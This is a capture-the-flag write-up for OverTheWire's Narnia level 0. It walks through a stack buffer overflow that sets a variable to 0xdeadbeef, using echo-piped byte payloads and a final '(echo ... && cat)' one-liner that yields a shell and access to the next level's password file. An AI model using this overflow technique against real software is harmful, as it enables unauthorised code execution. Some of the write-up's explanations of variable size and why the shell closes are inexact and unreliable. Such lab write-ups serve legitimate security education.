# narnia 0 writeup
## this is my writeup for the narnia 0 wargame on overthewire

- access via ssh as narnia0@narnia.labs.overthewire.org on port 2226 with password narnia0
- you are given 2 files: narnia0 binary and narnia0.c source code
- the environment comes with tools like r2 and gdb to use
- password for the next level is at /etc/narnia_pass/narnia1

When running running the narnia0 binary and entering a value (123 in my case), this is what it looks like:

```shell
./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: 123
buf: 123
val: 0x41414141
WAY OFF!!!!
```
So let's take a look at the source code and see what's going on:

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```
First, the variable val is defined as val=0x41414141 (8 bytes long, but only the first 4 are defined - this is important) and 20 bytes of memory are allocated to the variable buf
The code then takes user input using scanf to write to buf, but takes 24 bytes specifically. This is important, because there are only 20 bytes allocated to buf, so what happens to the other 4 bytes? Let's have a look.
When running the binary again, but entering a value 24 characters long, this happens:

```shell
narnia0@narnia:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: bbbbbbbbbbbbbbbbbbbbbbbb
buf: bbbbbbbbbbbbbbbbbbbbbbbb
val: 0x62626262
WAY OFF!!!!
```
val's value changes!
this is because those extra 4 bytes that the scanf function accepts can't be stored in buf, so they overflow into the memory that is allocated to val, which is why it changes to 0x62626262 which is hex for bbbb, the last 4 bytes of my input.
I need to try to get val to become 0xdeadbeef, so I'll next try inputting those first 20 characters, and then deadbeef as hex:

```shell
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: bbbbbbbbbbbbbbbbbbbb\xde\xad\xbe\xef
buf: bbbbbbbbbbbbbbbbbbbb\xde
val: 0x6564785c
WAY OFF!!!!
narnia0@narnia:/narnia$ 
```
that didn't quite work. I'll try piping it into the code instead, so it is processed as hex before going into the scanf function, using echo -e:

```shell
narnia0@narnia:/narnia$ echo -e  "bbbbbbbbbbbbbbbbbbbb\xde\xad\xbe\xef" | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: bbbbbbbbbbbbbbbbbbbbޭ��
val: 0xefbeadde
WAY OFF!!!!
```
now, this is something. the only problem is that the hex bytes are backwards. this is because it's following little endian format, so it's allocated backwards to how it's read. I'll try reversing the hex bytes in my input and see if that does it:

```shell
narnia0@narnia:/narnia$ echo -e  "bbbbbbbbbbbbbbbbbbbb\xef\xbe\xad\xde" | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: bbbbbbbbbbbbbbbbbbbbﾭ�
val: 0xdeadbeef
narnia0@narnia:/narnia$ 
```
this looks good. so why I'm still not getting that shell. looking back at the code, this is because while the shell was opened, the main() function still returns 0 afterwards, so there's no time for me to get any input in. to fix this, I need to add a command to my input that will keep my input stream open so the code doesn't reach that return 0 line while I have the shell. The simplest way to do this is to add the cat command after using echo for my input like this:

```shell
narnia0@narnia:/narnia$ (echo -e  "bbbbbbbbbbbbbbbbbbbb\xef\xbe\xad\xde" && cat) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: bbbbbbbbbbbbbbbbbbbbﾭ�
val: 0xdeadbeef
whoami
narnia1
```
as you can see, I was able to get a shell, and when running whoami after, I am now narnia1. From here, all I need to do is get the password for narnia1 from /etc/narnia_pass/narnia1
